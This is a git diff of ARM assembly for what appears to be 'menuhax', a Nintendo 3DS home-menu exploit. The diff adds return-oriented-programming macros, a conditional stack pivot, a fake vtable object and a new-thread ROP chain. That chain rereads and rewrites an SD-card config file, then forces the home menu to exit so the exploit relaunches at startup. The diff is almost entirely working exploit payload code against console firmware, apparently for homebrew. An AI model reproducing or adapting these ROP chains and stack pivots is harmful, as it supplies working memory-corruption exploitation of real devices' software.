@@ -42,6 +42,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define NEWTHREAD_ROPBUFFER 0x0ff00000
 
+#define MAINLR_SVCEXITPROCESS 0x00100020 //LR of main(), svcExitProcess.
+
 .macro ROP_SETLR lr
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -220,6 +222,52 @@ ROP_SETLR ROP_POPPC
 .if \stackaddr_cmpmatch
 ROPMACRO_STACKPIVOT \stackaddr_cmpmatch, ROP_POPPC
 .endif
+.endm
+
+.macro ROPMACRO_CMPDATA_NEWTHREAD cmpaddr, cmpword, stackaddr_cmpmismatch
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word NEWTHREAD_ROPBUFFER + ((. + 0x14) - newthread_ropstart) @ r0
+
+.word POP_R1PC
+.word \cmpaddr @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *cmpaddr to ROPMACRO_CMPDATA_cmpword.
+
+.word POP_R0PC
+//ROPMACRO_CMPDATA_cmpword:
+.word 0 @ r0
+
+.word POP_R1PC
+.word \cmpword @ r1
+
+.word ROP_CMPR0R1
+
+.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4
+
+.word POP_R0PC
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_sploadword - newthread_ropstart) @ r0
+
+.word POP_R1PC
+.word \stackaddr_cmpmismatch @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.
+
+.word POP_R0PC
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_stackpivot_pcloadword - newthread_ropstart) @ r0
+
+.word POP_R1PC
+.word ROP_POPPC @ r1
+
+.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word NEWTHREAD_ROPBUFFER + (object - newthread_ropstart) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the value at cmpaddr matches cmpword, continue the ROP, otherwise do the above stack-pivot.
+
+.word 0, 0, 0 @ r4..r6
 .endm
 
 .macro ROPMACRO_WRITEWORD addr, value
@@ -743,6 +791,7 @@ ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish_jump - _start)), ROP_POPPC
 
 ret2menu_rop:
 
+#ifdef LOADSDCFG
 @ When u32 cfg+0x20 != 0x0, goto to ret2menu_rop_createthread, otherwise jump to ret2menu_rop_returnmenu.
 ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x20) - _start)), 0x0, (HEAPBUF + (ret2menu_rop_createthread - _start)), 0x0
 ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop_returnmenu - _start)), ROP_POPPC
@@ -765,6 +814,7 @@ CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, (HEAPBUF + (newthread_ropstart - _sta
 @ svcCreateThread(<tmp_scratchdata addr>, ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 28, -2);
 
 CALLFUNC svcCreateThread, (HEAPBUF + (tmp_scratchdata - _start)), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
+#endif
 
 ret2menu_rop_returnmenu:
 RET2MENUCODE
@@ -1061,7 +1111,7 @@ ROP_SETLR ROP_POPPC
 
 .word svcSleepThread
 
-.word 0x00100020 @ LR of main(), svcExitProcess.
+.word MAINLR_SVCEXITPROCESS
 #endif
 
 ROP_SETLR ROP_POPPC
@@ -1083,6 +1133,7 @@ ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC
 
 .word 0x58584148
 
+#ifdef LOADSDCFG
 newthread_ropstart:
 
 @ Sleep 5-seconds.
@@ -1125,12 +1176,59 @@ newthread_rop_r1data_cmphid:
 
 .word 0, 0, 0 @ r4..r6
 
-.word 0x41424344 @ Trigger a crash to verify that this worked.
+@ Read the cfg from FS again just in case it changed since menuhax initially ran.
+
+CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0
+
+CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 1, 0
+
+CALLFUNC_NOSP IFile_Read, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x24
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
+
+.word ROP_LDR_R0FROMR0
+
+.word IFile_Close
+
+@ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise trigger a crash. Mismatch can also be caused by file-reading failing.
+ROPMACRO_CMPDATA_NEWTHREAD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x0) - newthread_ropstart)), 0x3, (0x77889944)
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word 0x1 @ r0
+
+.word POP_R1PC
+.word (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x10) - newthread_ropstart)) @ r1
+
+.word ROP_STR_R0TOR1 @ Write 0x1 to cfg exec_type.
+
+@ Write the updated cfg to the file.
+
+CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0
+
+CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 0x3, 0
+
+CALLFUNC IFile_Write, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x24, 1, 0, 0, 0
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
+
+.word ROP_LDR_R0FROMR0
+
+.word IFile_Close
+
+.word MAINLR_SVCEXITPROCESS @ Cause homemenu to terminate, which then results in menuhax automatically launching during homemenu startup.
 
 newthread_rop_object:
 .word NEWTHREAD_ROPBUFFER + (newthread_rop_vtable - newthread_ropstart) @ object+0, vtable ptr
 .word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
-.word 0 @ Memchunk-hdr stuff writes here.
+.word 0
 .word 0
 
 .word NEWTHREAD_ROPBUFFER + ((newthread_rop_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
@@ -1150,8 +1248,22 @@ newthread_rop_vtable:
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
 
+newthread_menuhax_cfg:
+.space 0x24
+
+newthread_IFile_ctx:
+.space 0x20
+
+newthread_sdfile_cfg_path:
+.string16 "sd:/menuhax/menuhax_cfg.bin"
+.align 2
+
+newthread_tmp_scratchdata:
+.space 0x400
+
 newthread_ropend:
 .word 0
+#endif
 
 .align 4
 codedatastart:
